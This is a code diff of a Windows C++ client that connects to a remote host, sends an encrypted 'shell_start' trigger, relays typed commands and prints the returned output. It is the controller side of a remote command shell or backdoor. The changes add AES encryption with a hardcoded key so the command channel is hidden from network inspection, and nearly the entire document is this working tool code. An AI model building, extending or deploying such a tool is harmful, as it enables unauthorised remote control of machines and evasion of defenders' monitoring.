@@ -1,34 +1,34 @@
-#include <iostream>
-#include <string>
-#include <winsock2.h>  
-#include <thread>
+#include "client.h"
+
 #pragma comment(lib, "ws2_32.lib")
 
+static uint8 key[16] = {
+    0x0f,0x15,0x71,0xc9,
+    0x47,0xd9,0xe8,0x59,
+    0x0c,0xb7,0xad,0xd6,
+    0xaf,0x7f,0x67,0x98
+};
+
 using namespace std;
-
-#define SERVER_PORT 54321
-#define CLIENT_PORT 8888
-#define SERVER_IP "192.168.124.212"
-#define CLIENT_IP "192.168.124.1"
-#define  BUFFER_SIZE 1024
-
-static void proc_output(SOCKET client_socket);
 
 void proc_output(SOCKET client_socket)
 {
     while (true) {
         char recv_data[BUFFER_SIZE] = {};
-        int ret = recv(client_socket, recv_data, BUFFER_SIZE, 0);
-        if (ret < 0) {
-            cout << "[!] failed to receive data!" << endl;
+        int buf_len = recv(client_socket, recv_data, BUFFER_SIZE, 0);
+        if (buf_len < 0) {
+            cout << "[!] failed to receive data (" << GetLastError() << ")!" << endl;
             break;
         }
-
-        cout << recv_data;
+        char* decrypt_data = NULL;
+        decrypt_payload(recv_data, decrypt_data, buf_len);
+        cout << decrypt_data;
     }
 }
 
-int main() {
+int main() 
+{
+    aes_set_key(&g_aes_ctx, key, 128);
     WORD winsock_version = MAKEWORD(2, 2);
     WSADATA wsa_data;
     if (WSAStartup(winsock_version, &wsa_data) != 0) {
@@ -64,23 +64,60 @@ int main() {
 
     cout << "[*] connect to address:" << SERVER_IP << ": " << SERVER_PORT << " successfully!" << endl;
     thread output_thread = thread(proc_output, client_socket);
+
+    char* shell_start_buf;
+    UINT buf_len;
+    encrypt_payload(SHELL_START, shell_start_buf, buf_len);
+    if (send(client_socket, shell_start_buf, buf_len, 0) < 0) {
+        cout << "[!] failed to send data(" << GetLastError() << ")!" << endl;
+    }
     output_thread.detach();
-    if (send(client_socket, "shell_start", strlen("shell_start"), 0) < 0) {
-        cout << "[!] failed to send data!" << endl;
-    }    
-    cout << "[*] shell start" << endl;
     while (true) {
         string data;
         cin >> data;
         data += "\r\n";
-        if (send(client_socket, data.c_str(), data.size(), 0) < 0) {
+        UINT data_len;
+        char* encrypt_data;
+        encrypt_payload(data.c_str(), encrypt_data, data_len);
+        if (send(client_socket, encrypt_data, data_len, 0) < 0) {
             cout << "[!] failed to send data!" << endl;
+            free(encrypt_data);
             break;
         }
+        free(encrypt_data);
     }
 
     closesocket(client_socket);
     WSACleanup();
 
     return 0;
+}
+
+void encrypt_payload(const char* original_buf, char*& encrypt_buf, UINT& buf_len)
+{
+    buf_len = strlen(original_buf);
+    buf_len = (buf_len / 16 + 1) * 16;
+    encrypt_buf = (char*)malloc(buf_len);
+    if (!encrypt_buf)
+        return;
+    memset(encrypt_buf, 0, buf_len);
+    memcpy(encrypt_buf, original_buf, strlen(original_buf));
+    char* tmp = encrypt_buf;
+    for (int i = 0; i != buf_len; i += 16)
+    {
+        aes_encrypt(&g_aes_ctx, (uint8*)tmp);
+        tmp += 16;
+    }
+}
+
+void decrypt_payload(const char* encrypt_buf, char*& decrypt_buf, UINT buf_len)
+{
+    decrypt_buf = (char*)malloc(buf_len);
+    memcpy(decrypt_buf, encrypt_buf, buf_len);
+    char* tmp = decrypt_buf;
+    for (int i = 0; i != buf_len; i += 16)
+    {
+        aes_decrypt(&g_aes_ctx, (uint8*)tmp);
+        tmp += 16;
+    }
 }
